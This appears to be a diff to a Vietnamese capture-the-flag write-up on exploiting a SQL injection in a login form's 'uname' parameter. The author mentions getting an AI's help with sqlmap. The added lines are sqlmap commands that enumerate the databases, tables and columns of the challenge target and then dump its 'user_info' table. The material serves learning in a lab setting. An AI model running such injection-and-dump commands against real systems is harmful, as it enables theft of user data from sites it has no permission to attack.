@@ -64,6 +64,26 @@ Giờ mình khai thác lỗ hỏng này tuần tự, do đề bài không cho th
 
 Mình test một lúc thì nhận ra sức người khó mà đoán được kiểu dữ liệu từng cột, nên mình mày mò nhờ AI chỉ cách dùng tool SQLMap để automate:D :
 ```bash
-python sqlmap.py -r req.txt --batch --dbs --force-ssl --random-agent \
-  -p uname --technique=U --union-cols=4 --string="home.php" -v 3
+python sqlmap.py -r req.txt --batch --dbs --random-agent \
+  -p uname --technique=B \
+  --string="home.php" \
+  --force-ssl -v 3
 ```
+![[Pasted image 20261013161202.png]]
+
+```bash
+python sqlmap.py -r req.txt --batch --tables --random-agent --force-ssl
+```
+![[Pasted image 20261013161130.png]]
+
+```bash
+python sqlmap.py -r req.txt --batch -T user_info --columns --random-agent --force-ssl
+```
+
+![[Pasted image 20261013161914.png]]
+
+```bash
+python sqlmap.py -r req.txt --batch --random-agent --force-ssl -T user_info --dump
+```
+
+
